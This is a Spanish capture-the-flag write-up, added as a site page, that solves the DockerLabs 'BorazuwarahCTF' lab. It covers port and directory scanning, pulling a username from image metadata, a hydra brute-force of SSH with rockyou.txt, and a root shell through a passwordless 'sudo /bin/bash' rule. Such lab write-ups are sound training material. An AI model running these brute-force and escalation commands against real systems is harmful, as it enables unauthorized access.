@@ -1,0 +1,176 @@
+---
+title: BorazuwarahCTF
+description: Resolución completa de la máquina virtual *BorazuwarahCTF* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **BorazuwarahCTF**, desarrollada por *BorazuwarahCTF* para la plataforma **DockerLabs**, clasificada con una dificultad **Muy Fácil**.
+El laboratorio expone un servicio web que contiene una imagen con metadatos ocultos que revelan un nombre de usuario. A partir de esta información, se realiza un ataque de fuerza bruta contra el servicio SSH para obtener acceso al sistema como el usuario `borazuwarah`.
+Tras el acceso inicial, se identifica una configuración insegura de `sudo` que permite la ejecución de `/bin/bash` como cualquier usuario sin autenticación adicional, facilitando una escalada de privilegios inmediata hasta obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+    title=""
+    data={{
+    Nombre: 'BorazuwarahCTF',
+    Autor: 'BorazuwarahCTF',
+    Dificultad: 'Muy Fácil',
+    Fecha: '28/05/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+    }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip BorazuwarahCTF.zip
+sudo bash auto_deplo.sh BorazuwarahCTF.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748329772/ipScan_ifwllz.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p BorazuwarahCTF/{content,exploits,nmap,scripts}
+cd BorazuwarahCTF
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1748412617/Ports_a9i4za.png)
+
+---
+
+### 1.2 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 200
+```
+
+![Gobuster result](https://res.cloudinary.com/dewqswzke/image/upload/v1748412613/Gobuster_gpi8fv.png)
+
+El resultado muestra únicamente el archivo `index`, que contiene una imagen con el mensaje "¡Te quiero!".
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1748412615/Kinder_jw5ncj.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+Se descarga la imagen y se analizan sus metadatos para extraer información oculta:
+
+```bash
+wget http://172.17.0.2/imagen.jpeg
+exiftool imagen.jpeg
+```
+
+![Exiftool](https://res.cloudinary.com/dewqswzke/image/upload/v1748412612/Exiftool_jvgsqq.png)
+
+En los metadatos se encuentra un posible nombre de usuario: `borazuwarah`.
+
+Con esta información, se realiza un ataque de fuerza bruta contra el servicio SSH utilizando el diccionario `rockyou.txt`:
+
+```bash
+hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1748412614/Hydra_xxfps6.png)
+
+Se obtienen las credenciales correctas y se accede al sistema vía SSH:
+
+```bash
+ssh borazuwarah@172.17.0.2
+```
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De borazuwarah → root
+
+Al acceder al sistema, se verifican los permisos sudo del usuario:
+
+```bash
+sudo -l
+```
+
+El usuario puede ejecutar `/bin/bash` como cualquier otro usuario sin necesidad de contraseña.
+
+Se utiliza `searchbins` para verificar si existe una ruta en GTFOBins:
+
+```bash
+searchbins -b bin -f bash
+```
+
+Se ejecuta el siguiente comando para obtener una shell con privilegios de root:
+
+```bash
+sudo /bin/bash
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1748412618/Root_mmmmoj.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+    title=""
+    data={[
+    {
+        vulnerability: "Exposición de información en metadatos de imagen",
+        severity: "Media",
+        impact: "Revelación de nombre de usuario válido"
+    },
+    {
+        vulnerability: "Contraseña débil en servicio SSH",
+        severity: "Crítica",
+        impact: "Acceso no autorizado al sistema"
+    },
+    {
+        vulnerability: "Configuración insegura de sudo",
+        severity: "Crítica",
+        impact: "Escalada de privilegios a root"
+    },
+    {
+        vulnerability: "Falta de autenticación multifactor",
+        severity: "Alta",
+        impact: "Compromiso total del sistema"
+    }
+    ]}
+/>
